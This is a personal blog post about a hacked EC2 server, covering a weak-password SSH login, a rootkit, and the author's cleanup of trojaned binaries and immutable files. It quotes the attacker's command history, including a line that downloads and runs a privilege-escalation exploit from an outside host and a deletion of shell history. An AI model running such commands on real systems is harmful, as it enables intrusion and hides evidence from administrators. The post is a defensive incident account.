--- 
layout: post
title: The Site Was r00ted
published: true
meta: 
  _edit_last: "2"
tags: []

type: post
status: publish
---
As you might know, there was a little bit of downtime… from December 28 to January 6th.  First of all, sorry about that… I was doing a bunch of holiday stuff.  At any rate, when I noticed the <a style="outline-style: none; outline-width: initial; outline-color: initial; text-decoration: none; color: #215c97; padding: 0px; margin: 0px;" href="http://aws.amazon.com/ec2/">EC2</a> instance was unresponsive, I figured it was the fault of EC2.  So, I just rebooted the instance and went on my merry way.
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">Flash forward to today.  I got on my box to do some maintenance, and saw the following warning:</p>

<pre style="padding: 0px; margin: 0px;">~/tmp$ ls
&gt; ls: unrecognized prefix: do
&gt; ls: unparsable value for LS_COLORS environment variable.</pre>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">“Well that’s weird”, I thought to myself.  I googled around the internet, and came to the conclusion I’d been rooted.  Turns out, I was right.</p>

<h2 style="margin-top: 0px; margin-right: 0px; margin-bottom: 10px; margin-left: 0px; font: normal normal bold 150%/normal Georgia, serif; padding: 0px;">Mistake #1</h2>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">Now comes the fun part of all of these.  I had to track down just *how* it happened.  First thing that I did was went to /var/log/auth.log.  I see brute force attacks all the time, and it totally fills up the logs, so I went to when made the most sense — around the time the site when down.  That’s when I noticed this entry:</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;"><code style="font: normal normal normal 120%/normal Courier, serif; padding: 0px; margin: 0px;">Dec 28 14:03:25 ip-10-251-69-178 sshd[13661]: Accepted password for deploy from 92.82.99.209 port 2608 ssh2<br style="padding: 0px; margin: 0px;" />Dec 28 14:03:25 ip-10-251-69-178 sshd[13661]: pam_unix(sshd:session): session opened for user deploy by (uid=0)</code></p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">*slap*</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">I had forgotten I created a mostly temporary user named “deploy” with a weak password (umm… “deploy”).  I thought it would be ok since that user had very little permissions — files I didn’t care about, no sudo access, etc.  Boy, was I wrong.  Which brings me to…</p>

<h2 style="margin-top: 0px; margin-right: 0px; margin-bottom: 10px; margin-left: 0px; font: normal normal bold 150%/normal Georgia, serif; padding: 0px;">Mistake #2</h2>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">Everyone always says keep your system up to date.  I also think it’s a good practice.  But do I?  Of course not.  I was using an outdated (non-updated) version of Ubuntu 8.10.  Put yourself in the hax0rs shoes: if you were breaking into a box, had user access, the os was out of date, and you wanted root, how would you do it?  A rootkit, of course!  And that’s exactly what happened…</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;"><code style="font: normal normal normal 120%/normal Courier, serif; padding: 0px; margin: 0px;">w<br style="padding: 0px; margin: 0px;" />uname -a<br style="padding: 0px; margin: 0px;" />id<br style="padding: 0px; margin: 0px;" />sudo su<br style="padding: 0px; margin: 0px;" />ls -a<br style="padding: 0px; margin: 0px;" />cat .bash_history<br style="padding: 0px; margin: 0px;" />cat /proc/cpuinfo<br style="padding: 0px; margin: 0px;" />cat /etc/issue<br style="padding: 0px; margin: 0px;" />cat /etc/hosts<br style="padding: 0px; margin: 0px;" />wget http://members.lycos.co.uk/timisoara/l3.tar.gz;tar zxvf l3.tar.gz;cd linux-sendpage3;chmod 777 *;./run;id<br style="padding: 0px; margin: 0px;" />ls -a<br style="padding: 0px; margin: 0px;" />rm -rf .bash_history<br style="padding: 0px; margin: 0px;" />wget http://members.lycos.co.uk/timisoara/l3.tar.gz;tar zxvf l3.tar.gz;cd linux-sendpage3;chmod 777 *;./run;id<br style="padding: 0px; margin: 0px;" />sudo su -</code></p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">A little sidenote… if he removed the bash_history, how did I get this command history?  Look closely… whatever script it was, it “cd”ed into the linux-sendpage3 directory before it rm’ed the bash_history.  Sucka  :) .  Anyways, there’s the rootkit, and him logging in as root with “sudo su -”.</p>

<h2 style="margin-top: 0px; margin-right: 0px; margin-bottom: 10px; margin-left: 0px; font: normal normal bold 150%/normal Georgia, serif; padding: 0px;">He was root.  OMG!</h2>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">The next part seems kind of fuzzy to me as to what he did.  I didn’t have any logs (root’s bash_history was clean), and there were no logs anywhere else on the system.  What I did have was one thing: ls was acting funky.  Surely he replaced it, so at least it would be a start.  Upon further inspection, it was owned by the user 122, and group messagebus.  Well, at least that’s a start!</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;"><code style="font: normal normal normal 120%/normal Courier, serif; padding: 0px; margin: 0px;">root@ip-10-251-69-178:~/bin# find / -user 122<br style="padding: 0px; margin: 0px;" />/usr/bin/pstree<br style="padding: 0px; margin: 0px;" />/usr/bin/top<br style="padding: 0px; margin: 0px;" />/usr/bin/md5sum<br style="padding: 0px; margin: 0px;" />/usr/bin/find<br style="padding: 0px; margin: 0px;" />/bin/ps<br style="padding: 0px; margin: 0px;" />/bin/ls<br style="padding: 0px; margin: 0px;" />/bin/netstat<br style="padding: 0px; margin: 0px;" />/sbin/ttyload<br style="padding: 0px; margin: 0px;" />/sbin/ttymon<br style="padding: 0px; margin: 0px;" />/sbin/ifconfig</code></p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">It looks like he changed a bunch of important files here, he certainly didn’t want me snooping into what he was doing.  Those modifications hid all the files and processes he was using, of course.  So my next step was to restore those files so I could dig deeper into what was going on.  With EC2, that’s a piece of cake — I fired up another Ubuntu 8.10 ami, and copied over the binaries.  Here’s where I got bottlenecked… I was getting some silly “Permission denied” error, even though I was root!  lsattr to the rescue.</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;"><code style="font: normal normal normal 120%/normal Courier, serif; padding: 0px; margin: 0px;">root@ip-10-251-69-178:~/bin# lsattr /bin/ls<br style="padding: 0px; margin: 0px;" />s---ia------------- /bin/ls</code></p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">Super-secret permissions!  no!</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;"><code style="font: normal normal normal 120%/normal Courier, serif; padding: 0px; margin: 0px;">root@ip-10-251-69-178:~/bin# chattr -sia /bin/ls; mv /tmp/ls.fix /bin/ls<br style="padding: 0px; margin: 0px;" /></code></p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">Whew, that was a close one.</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">Next, I ran the ‘find’ command to see if other files had shown up, and indeed they did.  Two directories — “/usr/lib/libsh” and “/lib/libsh.so” were owned by this guy.  There were a few utility scripts in these directories to clean logs and such, and also some program named mirkforce — which looks like some irc bot.  So, all of this for some stupid script kiddie?  Augh, lame.</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">There were two other things that I got bored with and didn’t look into anymore — a crontab as root that executed “/dev/s/y2kupdate &gt;/dev/null” every minute (thanks for keeping my computer updated), and some dbus process that hogged a bunch of resources.</p>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">At any rate, there were two things that came out of this:</p>

<ol style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 20px; padding: 0px;">
	<li style="padding: 0px; margin: 0px;"><strong style="padding: 0px; margin: 0px;">Don’t use easy passwords.  Ever.</strong></li>
	<li style="padding: 0px; margin: 0px;"><strong style="padding: 0px; margin: 0px;">Keep your systems up-to-date.</strong></li>
</ol>
<p style="margin-top: 0px; margin-right: 0px; margin-bottom: 20px; margin-left: 0px; padding: 0px;">I’m sure this entire thing was automated, so I didn’t fear stolen information so much (not that there was any to give).  He left all my data in place, so I just ditched the whole box, fired up another EC2 instance, and was running on a fresh install of Ubuntu 9.10 in about 10 minutes.  Amazon  Web Services win again!</p>
